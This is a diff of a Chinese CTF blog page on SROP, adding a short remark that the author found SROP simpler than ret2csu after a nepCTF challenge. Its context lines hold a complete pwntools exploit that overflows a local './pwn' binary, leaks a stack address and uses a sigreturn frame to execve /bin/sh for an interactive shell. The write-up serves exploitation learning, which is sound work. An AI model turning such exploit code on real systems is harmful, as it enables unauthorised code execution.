@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://shmodifier.github.io/img/SROP/%E9%A1%B5%E9%A6%96%E5%9B%BE.jpg">
 <meta property="article:published_time" content="2023-08-15T13:32:53.000Z">
-<meta property="article:modified_time" content="2023-11-02T13:45:32.824Z">
+<meta property="article:modified_time" content="2023-11-02T13:47:43.534Z">
 <meta property="article:author" content="Modifier">
 <meta property="article:tag" content="Knowledge">
 <meta property="article:tag" content="栈">
@@ -464,6 +464,11 @@
 <p>或者</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>e=ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>p=process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br>vuln_addr=<span class="hljs-number">0x04004F1</span><br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(vuln_addr)<br><br>p.sendline(pay)<br>add=p.recvuntil(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(u64(add)-<span class="hljs-number">0x118</span>))<br>stack=u64(add)-<span class="hljs-number">0x118</span><br>log.info(<span class="hljs-string">&#x27;stack:&#x27;</span>+<span class="hljs-built_in">hex</span>(stack))<br><br>syscall_ret=<span class="hljs-number">0x0400517</span>   <span class="hljs-comment"># syscall ; ret</span><br>rax=<span class="hljs-number">0x004004DA</span>  <span class="hljs-comment">#mov rax, 0Fh;ret</span><br>frame = SigreturnFrame()<br>frame.rax = <span class="hljs-number">59</span><br>frame.rdi = stack<br>frame.rsi = <span class="hljs-number">0</span><br>frame.rdx = <span class="hljs-number">0</span><br>frame.rip = syscall_ret<br>pay=<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-built_in">len</span>(<span class="hljs-string">&#x27;/bin/sh\x00&#x27;</span>))+p64(rax)+p64(syscall_ret)+<span class="hljs-built_in">str</span>(frame)<br>p.sendline(pay)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
+
+
+<hr>
+<p>事情要从我在nepCTF做了一个SROP但根本不会做开始说起···</p>
+<p>之前做过这个例题但是就使用 ret2csu 做的，现在发现 SROP 更简单</p>
 
                 
               </div>
